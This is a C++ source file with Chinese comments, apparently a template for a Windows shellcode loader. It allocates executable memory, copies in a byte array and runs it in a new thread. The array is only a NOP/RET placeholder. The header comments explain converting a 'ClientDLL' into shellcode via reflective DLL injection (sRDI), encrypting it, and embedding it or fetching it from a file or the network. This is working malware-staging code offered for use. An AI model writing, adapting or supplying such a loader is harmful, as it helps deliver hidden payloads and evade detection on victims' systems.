#include <windows.h>
#include <cstdio>
#include <vector>

/**
 * ShellCode Loader (Template)
 * ---------------------------
 * 这个程序演示如何加载并执行 ShellCode。
 * 
 * 如何生成 ShellCode:
 * 1. 编译 ClientDLL 项目生成 ClientDLL.dll
 * 2. 使用工具（如 sRDI - Shellcode Reflective DLL Injection）将 DLL 转换为 ShellCode
 *    python ConvertToShellcode.py ClientDLL.dll
 * 3. 将生成的 bin 文件内容加密或转换后填入下方的 shellcode 数组，或者从文件/网络读取。
 */

// 示例 ShellCode (NOPs + RET)
unsigned char g_ShellCode[] = {
    0x90, 0x90, 0x90, 0xC3
};

int main() {
    // 1. 获取 ShellCode 大小
    size_t shellcodeSize = sizeof(g_ShellCode);
    
    printf("[*] ShellCode Loader Started. Size: %zu bytes\n", shellcodeSize);

    // 2. 分配可执行内存
    void* execMem = VirtualAlloc(0, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Memory allocated at: %p\n", execMem);

    // 3. 复制 ShellCode 到内存
    memcpy(execMem, g_ShellCode, shellcodeSize);
    printf("[+] Shellcode copied.\n");

    // 4. 执行 ShellCode
    printf("[*] Executing...\n");
    
    // 方法 A: 创建线程执行
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    } else {
        // 方法 B: 直接跳转 (仅适用于简单 ShellCode)
        // ((void(*)())execMem)();
        printf("[-] CreateThread failed: %d\n", GetLastError());
    }

    printf("[+] Execution finished.\n");
    VirtualFree(execMem, 0, MEM_RELEASE);
    return 0;
}
